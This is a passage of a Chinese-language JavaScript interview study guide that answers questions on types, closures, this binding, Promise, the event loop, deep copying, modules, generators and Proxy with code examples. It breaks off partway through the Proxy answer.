# JavaScript 面试题

## Q1. 原始类型和引用类型的区别是什么？

**答：**

| 特性 | 原始类型 | 引用类型 |
|------|----------|----------|
| 存储位置 | 栈内存 | 堆内存 |
| 赋值方式 | 值拷贝 | 地址拷贝（浅拷贝） |
| 比较方式 | 值比较 | 地址比较 |
| 类型 | string, number, boolean, null, undefined, symbol, bigint | object, array, function, Date, RegExp |

```javascript
// 原始类型 - 值拷贝
let a = 1
let b = a
b = 2
console.log(a)  // 1（不受影响）

// 引用类型 - 地址拷贝
let obj1 = { x: 1 }
let obj2 = obj1
obj2.x = 2
console.log(obj1.x)  // 2（被修改）

// 深拷贝方法
const deepClone = JSON.parse(JSON.stringify(obj))  // 有局限
const deepClone2 = structuredClone(obj)  // 现代浏览器
const deepClone3 = _.cloneDeep(obj)  // lodash
```

---

## Q2. == 和 === 的区别？

**答：**

- `==` 是**宽松相等**，会进行类型转换（隐式类型转换）
- `===` 是**严格相等**，必须类型和值都相同

```javascript
0 == '0'       // true（字符串转数字）
0 === '0'      // false（类型不同）

null == undefined   // true（ECMAScript 规定）
null === undefined  // false

[] == ![]      // true（![] 转为 false，[] 转为 0）
[] === ![]     // false

[1] == '1'     // true
{ } == '[object Object]'  // true（对象转字符串）

// 面试中常见的 "=="
NaN == NaN         // false（NaN 与任何值都不相等，包括自己）
+0 == -0           // true
+0 === -0          // true
Object.is(+0, -0)  // false

// 推荐使用 === 和 !==，避免隐式转换的意外行为
```

**== 转换规则概括：**
1. undefined 和 null 相等，且不等于其他值
2. 字符串和数字比较，字符串转数字
3. 布尔值和其他类型比较，布尔值转数字
4. 对象和原始类型比较，对象转原始值（先 valueOf 再 toString）

---

## Q3. JS 中有哪些数据类型？如何判断？

**答：**

### 7 种基本类型（ES6 后）

```javascript
typeof 'hello'      // 'string'
typeof 42           // 'number'
typeof true         // 'boolean'
typeof undefined    // 'undefined'
typeof Symbol()     // 'symbol'
typeof 1n           // 'bigint'
typeof null         // 'object' (历史遗留 bug)
```

### 引用类型

```javascript
typeof {}           // 'object'
typeof []           // 'object'
typeof function(){} // 'function'
typeof /regex/      // 'object'
```

### 类型判断方法

```javascript
// 1. typeof - 判断基本类型（除 null）
typeof 'hello' === 'string'

// 2. instanceof - 判断实例关系（不能判断基本类型）
[] instanceof Array           // true
[] instanceof Object          // true（继承链）
'a' instanceof String         // false（不是实例）
new String('a') instanceof String  // true

// 3. Object.prototype.toString（最准确）
Object.prototype.toString.call([])     // '[object Array]'
Object.prototype.toString.call({})     // '[object Object]'
Object.prototype.toString.call(null)   // '[object Null]'
Object.prototype.toString.call(1)      // '[object Number]'

// 封装类型判断函数
function getType(value) {
  return Object.prototype.toString.call(value).slice(8, -1)
}

// 4. Array.isArray
Array.isArray([])   // true
Array.isArray({})   // false

// 5. constructor（不可靠，可被改写）
[].constructor === Array
```

---

## Q4. undefined 和 null 的区别？

**答：**

| 特性 | undefined | null |
|------|-----------|------|
| 含义 | 未定义（声明未赋值） | 空值（有意赋值为空） |
| 类型 | undefined | object（历史 bug） |
| 场景 | 变量声明未赋值、函数无 return、对象无该属性 | API 返回空、链结束时、显式清空 |

```javascript
let a
console.log(a)            // undefined

let obj = {}
console.log(obj.x)        // undefined

function fn() {}
console.log(fn())       // undefined

// 显式赋值为空
let user = null  // 表示用户数据待获取

// 区别
null == undefined   // true
null === undefined  // false

// typeof 结果
typeof undefined    // 'undefined'
typeof null         // 'object'（历史原因，不推荐用于判断）

// 建议：总是用 === 检查 null
checkNull === null
checkUndefined === undefined
checkEither == null  // 同时检查 null 和 undefined
```

---

## Q5. let、const、var 的区别？

**答：**

| 特性 | var | let | const |
|------|-----|-----|-------|
| 作用域 | 函数作用域 | 块级作用域 | 块级作用域 |
| 提升 | 有（值为 undefined） | 有（暂时性死区 TDZ） | 有（暂时性死区 TDZ） |
| 重复声明 | 允许 | 不允许 | 不允许 |
| 重新赋值 | 可以 | 可以 | 不可以（但对象属性可修改） |

```javascript
// 作用域差异
function scope() {
  if (true) {
    var a = 1
    let b = 2
    const c = 3
  }
  console.log(a)  // 1（var 是函数作用域）
  console.log(b)  // ReferenceError（let 是块级作用域）
  console.log(c)  // ReferenceError（const 是块级作用域）
}

// 变量提升
console.log(varVar)   // undefined（已提升）
console.log(letVar)   // ReferenceError: TDZ
console.log(constVar) // ReferenceError: TDZ
var varVar = 1
let letVar = 2
const constVar = 3

// const 的细节
const obj = { a: 1 }
obj.a = 2           // ✓ 可以修改属性
obj = { a: 3 }      // ✗ 不能重新赋值（报错）

const arr = [1, 2]
arr.push(3)         // ✓ 可以
arr = [4, 5]        // ✗ 不能重新赋值

// 真正冻结
Object.freeze(obj)  // 属性不可修改（浅冻结）

// 循环中使用
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 1000)  // 3,3,3（i 被共享）
}

for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 1000)  // 0,1,2（每次有新的 i）
}
```

---

## Q6. 什么是闭包？有什么应用？

**答：**

**闭包**是指函数能够记住并访问其词法作用域的能力，即使该函数在其词法作用域之外执行。

```javascript
// 基础闭包
function outer() {
  let count = 0
  
  function inner() {
    return ++count  // inner 访问 outer 的变量
  }
  
  return inner
}

const counter = outer()
counter()  // 1
counter()  // 2（count 被保留在内存中）

// 实际应用

// 1. 模块模式
const Module = (function() {
  let privateVar = 'private'
  
  function privateMethod() {
    console.log(privateVar)
  }
  
  return {
    publicMethod: function() {
      privateMethod()
    }
  }
})()

// 2. 函数柯里化
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args)
    } else {
      return function(...args2) {
        return curried.apply(this, [...args, ...args2])
      }
    }
  }
}

const add = curry((a, b, c) => a + b + c)
add(1)(2)(3)   // 6
add(1, 2)(3)   // 6
add(1)(2, 3)   // 6

// 3. 防抖/节流
function debounce(fn, delay) {
  let timer
  return function(...args) {
    clearTimeout(timer)
    timer = setTimeout(() => fn.apply(this, args), delay)
  }
}

// 4. 缓存计算
function memoize(fn) {
  const cache = new Map()
  return function(...args) {
    const key = JSON.stringify(args)
    if (cache.has(key)) return cache.get(key)
    const result = fn(...args)
    cache.set(key, result)
    return result
  }
}

const fib = memoize(function(n) {
  if (n < 2) return n
  return fib(n - 1) + fib(n - 2)
})

// 5. 迭代器
function createCounter(start) {
  let value = start
  return {
    next() {
      return value++
    },
    reset() {
      value = start
    }
  }
}
```

**闭包注意事项：**
- 闭包会保持对外部变量的引用，可能导致内存泄漏
- 循环中使用闭包需注意（使用 let 或 IIFE）

---

## Q7. this 的指向规则？

**答：**

**this 的绑定规则（按优先级从高到低）：**

1. **new 绑定**：this 指向新创建的实例
2. **显式绑定**：call/apply/bind 强制指定
3. **隐式绑定**：调用时的上下文
4. **默认绑定**：非严格模式 window，严格模式 undefined
5. **箭头函数**：继承外层 this，无法被改变

```javascript
// 1. 默认绑定
function defaultFn() {
  console.log(this)  // window (非严格) / undefined (严格)
}
defaultFn()

// 2. 隐式绑定
const obj = {
  name: 'Tom',
  sayName() {
    console.log(this.name)  // 'Tom'
  }
}
obj.sayName()

// 隐式丢失
const say = obj.sayName
say()  // undefined（this 丢失）

// 3. 显式绑定
function explicit() {
  console.log(this.name)
}
explicit.call(obj)     // 'Tom'
explicit.apply(obj)    // 'Tom'
const bound = explicit.bind(obj)
bound()                // 'Tom'

// 4. new 绑定
function Person(name) {
  this.name = name  // this 指向新实例
}
const person = new Person('Tom')

// 5. 箭头函数（没有自己的 this）
const arrowObj = {
  name: 'Arrow',
  regular: function() {
    return function() {
      console.log(this.name)  // undefined（普通函数有自己的 this）
    }
  },
  arrow: function() {
    return () => {
      console.log(this.name)  // 'Arrow'（继承外层 this）
    }
  }
}

// 特殊情况
const special = {
  name: 'Special',
  // 箭头函数立即执行
  value: (() => {
    console.log(this)  // window（不是 'Special'）
    return 1
  })()
}
```

---

## Q8. 原型链是什么？如何实现继承？

**答：**

### 原型链

JavaScript 通过原型链实现继承。每个 JS 对象都有一个内部 `[[Prototype]]` 链接，在浏览器中通过 `__proto__` 访问。

```javascript
// 构造函数原型链
function Animal(name) {
  this.name = name
}

// 原型方法
Animal.prototype.speak = function() {
  console.log(this.name + ' speaks')
}

// 实例
const animal = new Animal('Leo')
animal.__proto__ === Animal.prototype  // true
Animal.prototype.__proto__ === Object.prototype  // true
Object.prototype.__proto__ === null  // 原型链终点

// 属性查找过程
animal.speak()
// 1. 查 animal 自身 -> 无
// 2. 查 animal.__proto__ (Animal.prototype) -> 找到 speak

// hasOwnProperty 检查自有属性
animal.hasOwnProperty('name')     // true
animal.hasOwnProperty('speak')    // false（原型上的）

// 遍历原型链的方法
function getPrototypeChain(obj) {
  const chain = []
  let current = obj
  while (current) {
    chain.push(current.constructor?.name || 'Object.prototype')
    current = Object.getPrototypeOf(current)
  }
  return chain
}
```

### 继承实现

```javascript
// ES5 继承（寄生组合式）
function Dog(name, breed) {
  Animal.call(this, name)  // 借用父构造函数
  this.breed = breed
}

// 继承原型（不调用父构造函数）
Dog.prototype = Object.create(Animal.prototype)
Dog.prototype.constructor = Dog

// 子类方法
Dog.prototype.bark = function() {
  console.log(this.name + ' barks')
}

const dog = new Dog('Buddy', 'Golden')
dog.bark()      // 子类方法
dog.speak()     // 父类方法（原型链查找）
dog instanceof Dog     // true
dog instanceof Animal  // true

// ES6 Class（更简洁）
class Animal {
  constructor(name) {
    this.name = name
  }
  
  speak() {
    console.log(this.name + ' speaks')
  }
  
  static isAnimal(obj) {
    return obj instanceof Animal
  }
}

class Dog extends Animal {
  constructor(name, breed) {
    super(name)  // 必须调用 super
    this.breed = breed
  }
  
  bark() {
    console.log(this.name + ' barks')
  }
  
  speak() {
    super.speak()  // 调用父类方法
    console.log('And barks!')
  }
}

// ES2022 私有字段
class BankAccount {
  #balance = 0  // 私有字段
  
  deposit(amount) {
    this.#balance += amount
  }
  
  get #formattedBalance() {  // 私有 getter
    return '$' + this.#balance
  }
}
```

---

## Q9. call、apply、bind 的区别？

**答：**

| 特性 | call | apply | bind |
|------|------|-------|------|
| 调用方式 | 立即执行 | 立即执行 | 返回新函数，不立即执行 |
| 参数传递 | 参数列表 | 参数数组 | 参数列表（可柯里化） |
| 返回值 | 函数执行结果 | 函数执行结果 | 绑定 this 的新函数 |

```javascript
const obj = { name: 'Tom' }

// 基础函数
function greet(greeting, punctuation) {
  console.log(greeting + ', ' + this.name + punctuation)
}

// call - 参数列表，立即执行
greet.call(obj, 'Hello', '!')  // 'Hello, Tom!'

// apply - 参数数组，立即执行
greet.apply(obj, ['Hi', '?'])  // 'Hi, Tom?'

// bind - 返回绑定的函数
const greetTom = greet.bind(obj)
greetTom('Hey', '...')  // 'Hey, Tom...'

// bind 的柯里化
const greetHello = greet.bind(obj, 'Hello')
greetHello('!')  // 'Hello, Tom!'
greetHello('...')  // 'Hello, Tom...'

// 手写实现
Function.prototype.myCall = function(context, ...args) {
  context = context || globalThis
  const fn = Symbol()
  context[fn] = this
  const result = context[fn](...args)
  delete context[fn]
  return result
}

Function.prototype.myApply = function(context, args = []) {
  return this.myCall(context, ...args)
}

Function.prototype.myBind = function(context, ...args1) {
  const fn = this
  return function(...args2) {
    return fn.call(context, ...args1, ...args2)
  }
}

// 实际应用场景

// 1. 借用方法
const max = Math.max.apply(null, [1, 2, 3])
const arr = Array.prototype.slice.call(arguments)

// 2. 转换类数组
function toArray() {
  return Array.prototype.slice.call(arguments)
}

// 3. 设置延迟调用的 this
const btn = document.querySelector('button')
btn.addEventListener('click', handler.showName.bind(handler))

// 4. 偏函数
const multiply = (a, b) => a * b
const double = multiply.bind(null, 2)
double(5)  // 10
```

---

## Q10. Promise 是什么？有哪些静态方法？

**答：**

**Promise** 是异步编程的解决方案，代表一个尚未完成但预期将来会完成的操作。

### Promise 状态

- `pending`：初始状态
- `fulfilled`（resolved）：操作成功
- `rejected`：操作失败

状态一旦改变，不可再次改变。

```javascript
// 创建 Promise
const promise = new Promise((resolve, reject) => {
  setTimeout(() => {
    if (success) resolve(data)
    else reject(error)
  }, 1000)
})

// 链式调用
promise
  .then(result => {
    console.log(result)
    return process(result)
  })
  .then(final => console.log(final))
  .catch(error => console.error(error))
  .finally(() => console.log('Done'))
```

### 静态方法

```javascript
// 1. Promise.all - 全部成功返回数组，任一失败返回第一个错误
const p1 = Promise.resolve(1)
const p2 = Promise.resolve(2)
const p3 = Promise.resolve(3)

Promise.all([p1, p2, p3])
  .then(values => console.log(values))  // [1, 2, 3]

Promise.all([p1, Promise.reject('error'), p3])
  .catch(err => console.log(err))  // 'error'

// 2. Promise.race - 返回最快完成的（无论成功失败）
Promise.race([
  new Promise((_, reject) => setTimeout(() => reject('timeout'), 100)),
  fetch('/api')
])

// 3. Promise.allSettled - 等待全部完成，返回状态数组
Promise.allSettled([
  Promise.resolve('success'),
  Promise.reject('error'),
  Promise.resolve('another')
])
.then(results => {
  console.log(results)
  // [
  //   { status: 'fulfilled', value: 'success' },
  //   { status: 'rejected', reason: 'error' },
  //   { status: 'fulfilled', value: 'another' }
  // ]
})

// 4. Promise.any - 返回第一个成功的，全部失败返回 AggregateError
Promise.any([
  Promise.reject('error1'),
  Promise.resolve('first success'),
  Promise.resolve('second success')
])
.then(value => console.log(value))  // 'first success'

// 5. Promise.resolve / Promise.reject
Promise.resolve(value)
Promise.reject(reason)

// 6. 串行 vs 并行
// 并行
const parallel = await Promise.all(urls.map(url => fetch(url)))

// 串行（reduce 实现）
const serial = await urls.reduce(
  (promise, url) => promise.then(results => 
    fetch(url).then(r => [...results, r])
  ),
  Promise.resolve([])
)

// 串行（for...of + await）
const results = []
for (const url of urls) {
  results.push(await fetch(url))
}
```

---

## Q11. async/await 是什么？如何使用？

**答：**

**async/await** 是 Promise 的语法糖，让异步代码看起来像同步代码，更易读和维护。

```javascript
// 基础用法
async function fetchData() {
  try {
    const response = await fetch('/api/data')
    if (!response.ok) throw new Error('HTTP error')
    const data = await response.json()
    return data  // 自动包装成 resolved Promise
  } catch (error) {
    console.error('Error:', error)
    throw error  // 自动包装成 rejected Promise
  }
}

// 并发执行
async function fetchMultiple() {
  try {
    // 错误：串行
    // const user = await fetchUser()
    // const posts = await fetchPosts()
    
    // 正确：并行
    const [user, posts] = await Promise.all([
      fetchUser(),
      fetchPosts()
    ])
    
    return { user, posts }
  } catch (error) {
    console.error('Fetch failed:', error)
  }
}

// 错误重试
async function fetchWithRetry(url, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url)
      if (response.ok) return response
    } catch (error) {
      if (i === maxRetries - 1) throw error
      await sleep(1000 * Math.pow(2, i))  // 指数退避
    }
  }
}

// Top-level await (ES2022)
// 直接在模块顶层使用
const data = await fetchData()

// async 函数返回 Promise
async function returnValue() {
  return 42  // Promise.resolve(42)
}

// 串行迭代
async function processItems(items) {
  const results = []
  for (const item of items) {
    // 串行执行，每个等待前一个完成
    const result = await processItem(item)
    results.push(result)
  }
  return results
}

// 并行迭代（注意性能）
async function processItemsParallel(items) {
  return Promise.all(items.map(item => processItem(item)))
}

// 有控制的并行
async function controlledParallel(items, limit = 5) {
  const results = []
  const executing = []
  
  for (const item of items) {
    const promise = processItem(item)
    results.push(promise)
    
    if (limit <= items.length) {
      const p = promise.then(() => executing.splice(executing.indexOf(p), 1))
      executing.push(p)
      if (executing.length >= limit) {
        await Promise.race(executing)
      }
    }
  }
  
  return Promise.all(results)
}
```

---

## Q12. 什么是事件循环（Event Loop）？

**答：**

** Event Loop** 是 JavaScript 实现异步编程的机制，协调调用栈、消息队列和微任务队列。

```
┌────────────────────────┐
│        Call Stack      │  ← 同步代码执行
│                        │     (执行完立刻出栈)
└───────────┬────────────┘
            │
            ▼
┌────────────────────────┐
│    Microtask Queue     │  ← Promise.then, queueMicrotask, process.nextTick
│                        │     (优先级高于宏任务，清空后才执行宏任务)
└───────────┬────────────┘
            │
            ▼
┌────────────────────────┐
│    Macrotask Queue     │  ← setTimeout, setInterval, setImmediate, I/O
│                        │     (每次取一个执行)
└────────────────────────┘
```

### 执行顺序

1. 同步代码 → 调用栈
2. 遇到微任务 → 进入微任务队列
3. 遇到宏任务 → 进入宏任务队列
4. 栈空时 → 清空微任务队列
5. 取出一个宏任务执行
6. 重复步骤 2-5

```javascript
console.log('1')                    // 1 同步

setTimeout(() => {
  console.log('2')                  // 宏任务
  Promise.resolve().then(() => {
    console.log('3')                // 宏任务中的微任务
  })
}, 0)

Promise.resolve().then(() => {
  console.log('4')                  // 微任务
  setTimeout(() => {
    console.log('5')                // 微任务中的宏任务
  }, 0)
})

console.log('6')                    // 6 同步

// 输出：1, 6, 4, 2, 3, 5

// async/await 转换
async function async1() {
  console.log('A')                  // 同步
  await async2()                    // 隐式 Promise.then
  console.log('B')                  // 微任务
}
async function async2() {
  console.log('C')                  // 同步（await 后的立即执行）
}
async1()
console.log('D')                    // 同步

// A, C, D, B

// 经典面试题
console.log('script start')

setTimeout(() => console.log('timeout1'), 0)

new Promise(resolve => {
  console.log('promise1')
  resolve()
}).then(() => {
  console.log('promise2')
})

console.log('script end')

// script start, promise1, script end, promise2, timeout1
```

---

## Q13. 防抖（debounce）和节流（throttle）是什么？

**答：**

| 特性 | 防抖 (debounce) | 节流 (throttle) |
|------|-----------------|-----------------|
| 触发时机 | 停止操作指定时间后执行 | 每隔指定时间执行 |
| 适用场景 | 输入搜索、窗口调整 | 滚动、按钮点击、mousemove |
| 类比 | 电梯（最后一个人进去后关门） | 地铁（固定间隔发车） |

```javascript
// 防抖
function debounce(fn, delay, immediate = false) {
  let timer = null
  
  return function(...args) {
    const context = this
    
    const callNow = immediate && !timer
    
    clearTimeout(timer)
    
    timer = setTimeout(() => {
      timer = null
      if (!immediate) fn.apply(context, args)
    }, delay)
    
    if (callNow) fn.apply(context, args)
  }
}

// 节流
function throttle(fn, limit, trailing = true) {
  let inThrottle = false
  let lastArgs = null
  
  return function(...args) {
    const context = this
    
    if (inThrottle) {
      lastArgs = args  // 保存最后一次参数
      return
    }
    
    fn.apply(context, args)
    inThrottle = true
    
    setTimeout(() => {
      inThrottle = false
      if (trailing && lastArgs) {
        fn.apply(context, lastArgs)
        lastArgs = null
      }
    }, limit)
  }
}

// 使用场景
// 防抖
const searchInput = document.getElementById('search')
searchInput.addEventListener('input', debounce(function() {
  console.log('Searching:', this.value)
}, 300))

// 节流
window.addEventListener('scroll', throttle(() => {
  console.log('Scrolled to:', window.scrollY)
}, 200))

// 使用 requestAnimationFrame 的节流（更丝滑）
function rafThrottle(fn) {
  let ticking = false
  
  return function(...args) {
    if (ticking) return
    
    requestAnimationFrame(() => {
      fn.apply(this, args)
      ticking = false
    })
    
    ticking = true
  }
}
```

---

## Q14. 深拷贝和浅拷贝的区别？如何实现深拷贝？

**答：**

| 特性 | 浅拷贝 | 深拷贝 |
|------|--------|--------|
| 拷贝内容 | 第一层属性 | 所有层级属性 |
| 引用类型 | 复制引用地址 | 创建新对象 |
| 影响原对象 | 修改深层会影响 | 完全独立 |

```javascript
// 浅拷贝方法
const obj = { a: 1, b: { c: 2 } }

// Object.assign
const shallow1 = Object.assign({}, obj)

// 展开运算符
const shallow2 = { ...obj }

// 修改测试
shallow1.b.c = 3
console.log(obj.b.c)  // 3（原对象被影响）

// 深拷贝方法

// 1. JSON 方法（最简单，有局限）
const deep1 = JSON.parse(JSON.stringify(obj))
// 缺点：忽略 undefined, function, symbol, Date, Map, Set, 循环引用

// 2. structuredClone（现代浏览器推荐）
const deep2 = structuredClone(obj)
// 支持：Date, Map, Set, ArrayBuffer, TypedArray
// 不支持：function, DOM, 原型链

// 3. lodash.cloneDeep
const deep3 = _.cloneDeep(obj)

// 4. 手写深拷贝（面试常考）
function deepClone(obj, hash = new WeakMap()) {
  // 处理 null 或非对象
  if (obj === null || typeof obj !== 'object') return obj
  
  // 处理日期
  if (obj instanceof Date) return new Date(obj)
  
  // 处理正则
  if (obj instanceof RegExp) return new RegExp(obj)
  
  // 处理函数（通常直接返回引用或 return obj）
  if (typeof obj === 'function') return obj
  
  // 处理循环引用（核心）
  if (hash.has(obj)) return hash.get(obj)
  
  // 创建新对象/数组
  const cloneObj = Array.isArray(obj) ? [] : {}
  
  // 存入 hash 解决循环引用
  hash.set(obj, cloneObj)
  
  // 处理 Map
  if (obj instanceof Map) {
    const map = new Map()
    obj.forEach((value, key) => {
      map.set(key, deepClone(value, hash))
    })
    return map
  }
  
  // 处理 Set
  if (obj instanceof Set) {
    const set = new Set()
    obj.forEach(value => {
      set.add(deepClone(value, hash))
    })
    return set
  }
  
  // 处理普通对象（包括数组）
  for (let key in obj) {
    if (obj.hasOwnProperty(key)) {
      cloneObj[key] = deepClone(obj[key], hash)
    }
  }
  
  return cloneObj
}

// 测试
const circle = { a: 1 }
circle.self = circle  // 循环引用

const cloned = deepClone(circle)
console.log(cloned !== circle)  // true
console.log(cloned.self === cloned)  // true
```

---

## Q15. 什么是事件冒泡和捕获？如何阻止？

**答：**

```
捕获阶段：window → document → html → body → 父元素 → 子元素
目标阶段：到达目标元素
冒泡阶段：子元素 → 父元素 → body → html → document → window
```

```javascript
// 事件监听器
element.addEventListener('click', handler, useCapture)
// useCapture: false（默认）- 冒泡阶段
// useCapture: true - 捕获阶段

// 阻止事件冒泡（向上传播）
event.stopPropagation()

// 阻止事件默认行为
form.addEventListener('submit', e => {
  e.preventDefault()  // 阻止表单提交
})

// 事件委托（性能优化）
// 利用冒泡，给父元素加监听
ul.addEventListener('click', e => {
  // e.target 是实际点击的元素
  if (e.target.tagName === 'LI') {
    console.log('Clicked:', e.target.textContent)
  }
})

// 阻止事件进一步传播（包括同一节点其他监听器）
event.stopImmediatePropagation()

// 阻止默认且停止冒泡
return false  // 旧的方式，不推荐

// modern API
element.addEventListener('click', e => {
  e.preventDefault()   // 阻止默认
  e.stopPropagation()  // 阻止冒泡
}, {
  capture: false,  // 是否捕获阶段
  once: true,    // 只触发一次
  passive: true  // 声明不会 preventDefault（提升滚动性能）
})
```

---

## Q16. 什么是 ES6 的解构赋值？

**答：**

**解构赋值**是从数组或对象中提取值并赋值给变量的语法糖。

```javascript
// 数组解构
const [a, b, c] = [1, 2, 3]
const [x, , z] = [1, 2, 3]  // 跳过中间值
const [first, ...rest] = [1, 2, 3, 4, 5]
const [a = 1, b = 2] = [undefined, null]  // a=1, b=null（null 不会触发默认值）

// 嵌套数组
const [[a], [b, c]] = [[1], [2, 3]]

// 对象解构
const { name, age } = { name: 'Tom', age: 25 }
const { name: userName, age: userAge } = { name: 'Tom', age: 25 }

// 默认值
const { name, age = 18, city = 'Beijing' } = { name: 'Tom' }

// 嵌套对象
const { user: { email } } = { 
  user: { email: 'tom@example.com', name: 'Tom' } 
}

// rest 属性（ES2018）
const { id, ...data } = { id: 1, name: 'Tom', age: 25 }
// data = { name: 'Tom', age: 25 }

// 函数参数解构
function createUser({ name, role = 'user', ...options }) {
  return { name, role, ...options }
}

// 解构失败保护
function drawChart({ size = 'big', cords = { x: 0, y: 0 } } = {}) {
  console.log(size, cords)
}
drawChart()  // 不报错，使用默认值

// 实际应用

// 交换变量
[a, b] = [b, a]

// 从 API 响应提取
fetch('/api/user')
  .then(({ data: { user } }) => console.log(user.name))

// 导入时解构
import { useState, useEffect } from 'react'

// JSON 转 CSV 的列提取
const rows = data.map(({ id, name, price }) => [id, name, price])

// 批量赋值
let a = 1, b = 2, c = 3
;[a, b, c] = [b, a, c]
```

---

## Q17. 什么是模块化？ES Module 和 CommonJS 的区别？

**答：**

| 特性 | ES Module (ESM) | CommonJS (CJS) |
|------|-----------------|----------------|
| 语法 | import / export | require / module.exports |
| 执行时机 | 编译时（静态分析） | 运行时（动态执行） |
| 加载方式 | 异步（浏览器）/同步（Node） | 同步 |
| 树摇优化 | 支持 | 不支持 |
| this 指向 | undefined | module.exports |
| 顶层 await | 支持 | 不支持 |
| 循环依赖 | 支持（部分） | 支持（部分） |

```javascript
// ES Module (浏览器/Node)
// math.js
export const PI = 3.14159
export function add(a, b) {
  return a + b
}
export default { version: '1.0.0' }

// main.js
import config, { PI, add } from './math.js'
import * as math from './math.js'
import { PI as PI_CONST } from './math.js'

// 动态导入（浏览器懒加载）
if (condition) {
  const module = await import('./feature.js')
}

// CommonJS (Node)
// math.js
const PI = 3.14159
function add(a, b) { return a + b }
module.exports = { PI, add }

// 或分开
exports.PI = PI
exports.add = add

// main.js
const { PI, add } = require('./math.js')
const math = require('./math.js')

// 互操作
// ES Module 引入 CJS
import fs from 'fs'  // 等价于 require()

// CJS 引入 ES Module（动态）
async function loadESM() {
  const module = await import('./esm.mjs')
}

// 循环依赖处理
// a.js
import { b } from './b.js'
export const a = 'a from a.js'
console.log(b)  // undefined（先执行，b 还没初始化）

// b.js
import { a } from './a.js'
export const b = 'b from b.js'
console.log(a)  // 'a from a.js'（已初始化）

// 最佳实践：循环依赖尽量避免，或把共享代码提取到第三个文件
```

---

## Q18. 什么是函数柯里化（Currying）？

**答：**

**柯里化**是把接受多个参数的函数转换成接受一个单一参数（最初函数的第一个参数）的函数，并返回一个接受余下参数的函数。

```javascript
// 普通函数
function add(a, b, c) {
  return a + b + c
}
add(1, 2, 3)  // 6

// 柯里化后
function curryAdd(a) {
  return function(b) {
    return function(c) {
      return a + b + c
    }
  }
}
curryAdd(1)(2)(3)  // 6

// 通用柯里化函数
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args)
    } else {
      return function(...args2) {
        return curried.apply(this, [...args, ...args2])
      }
    }
  }
}

// 使用
const add = curry((a, b, c) => a + b + c)
add(1)(2)(3)     // 6
add(1, 2)(3)     // 6
add(1)(2, 3)     // 6
add(1, 2, 3)     // 6

// 实际应用

// 配置预设
const fetchWithBaseURL = curry((baseURL, endpoint) => 
  fetch(baseURL + endpoint)
)
const api = fetchWithBaseURL('https://api.example.com')
api('/users')      // fetch('https://api.example.com/users')
api('/posts')      // fetch('https://api.example.com/posts')

// Redux compose
const compose = (...fns) => x => fns.reduceRight((v, f) => f(v), x)

// sum(1)(2)(3)() 形式的无限柯里化
function infiniteCurry(fn) {
  const nest = (args) => (...x) => 
    x.length ? nest([...args, ...x]) : fn(...args)
  return nest([])
}

const sum = infiniteCurry((...args) => args.reduce((a, b) => a + b))
sum(1)(2)(3)()   // 6
sum(1, 2)(3, 4)()  // 10
```

---

## Q19. 什么是 Generator 函数？

**答：**

**Generator** 是一种特殊的函数，可以暂停和恢复执行，使用 `function*` 语法声明，通过 `yield` 暂停。

```javascript
// 基础用法
function* generator() {
  console.log('Start')
  yield 1
  console.log('Resume 1')
  yield 2
  console.log('Resume 2')
  yield 3
  console.log('End')
}

const gen = generator()  // 返回迭代器，不立即执行

gen.next()  // { value: 1, done: false }，执行到第一个 yield
gen.next()  // { value: 2, done: false }
gen.next()  // { value: 3, done: false }
gen.next()  // { value: undefined, done: true }

// 双向通信
gen.next('value from outside')  // 作为上一个 yield 的返回值

// 应用场景

// 1. 无限序列（惰性求值）
function* fibonacci() {
  let [a, b] = [0, 1]
  while (true) {
    yield a
    ;[a, b] = [b, a + b]
  }
}
const fib = fibonacci()
fib.next().value  // 0
fib.next().value  // 1
fib.next().value  // 1
fib.next().value  // 2
fib.next().value  // 3
// ...

// 2. 自定义遍历器
function* objectKeys(obj) {
  const keys = Reflect.ownKeys(obj)
  for (const key of keys) {
    yield [key, obj[key]]
  }
}

// 3. 异步流控制（async/await 的前身）
function* fetchUserData() {
  const user = yield fetch('/api/user')
  const posts = yield fetch(`/api/posts/${user.id}`)
  return posts
}

// 4. Redux Saga 核心
function* loginFlow() {
  while (true) {
    const { user, password } = yield take('LOGIN_REQUEST')
    try {
      const token = yield call(api.login, user, password)
      yield put({ type: 'LOGIN_SUCCESS', token })
    } catch (error) {
      yield put({ type: 'LOGIN_ERROR', error })
    }
  }
}

// 5. 组合多个 Generator
function* combined() {
  yield* generator1()  // 委托给另一个 generator
  yield* generator2()
}

// yield 返回值的细节
function* demo() {
  const x = yield 1  // x = next() 传入的值
  const y = yield x + 10
  return y
}
const g = demo()
g.next()       // { value: 1, done: false }
g.next(5)      // { value: 15, done: false }，x = 5
```

---

## Q20. 什么是 Proxy？

**答：**

**Proxy** 用于创建一个对象的代理，可以拦截并重定义该对象的基本操作。

```javascript
// 基础用法
const target = { name: 'Tom', age: 25 }

const proxy = new Proxy(target, {
  // 读取属性
  get(obj, prop) {
    console.log('Getting', prop)
    return obj[prop]
  },
  
  // 设置属性
  set(obj, prop, value) {
    if (prop === 'age' && typeof value !== 'number') {
      throw new TypeError('Age must be a number')
    }
    console.log('Setting', prop, 'to', value)
    obj[prop] = value
    return true  // 必须返回 true
  },
  
  // 删除属性
  deleteProperty(obj, prop) {
    console.log('Deleting', prop)
    delete obj[prop]
    return true
  },
  
  // 检查属性是否存在
  has(obj, prop) {
    console.log('Checking has', prop)
    return prop in obj
  },
  
  // 遍历键
  ownKeys(obj) {
    return Object.keys(obj).filter(key => !key.startsWith('_'))
  }
})

// 使用
proxy.name  // 'Getting name' -> 'Tom'
proxy.age = 30  // 'Setting age to 30'
delete proxy._private  // 'Deleting _private'

// 实际应用

// 1. 数据验证
function createValidator(schema) {
  return new Proxy({}, {
    set(obj, prop, value) {
      if (schema[prop] && !(value instanceof schema[prop])) {
        throw new TypeError(`${prop} must be ${schema[prop].name}`)
      }
      obj[prop] = value
      return true
    }
  })
}

const person = createValidator({
  name: String,
  age: Number
})
person.name = 'Tom'    // ✓
person.age = 25        // ✓
// person.age = '25'   // ✗ TypeError

// 2. 私有属性保护
function withPrivate(obj) {
  return new Proxy(obj, {
    get(obj, prop) {
      if (typeof prop === 'string' && prop.startsWith('_')) {
        throw new Error('Access denied')
      }
      return obj[prop]
    },
    set(obj, prop, value) {
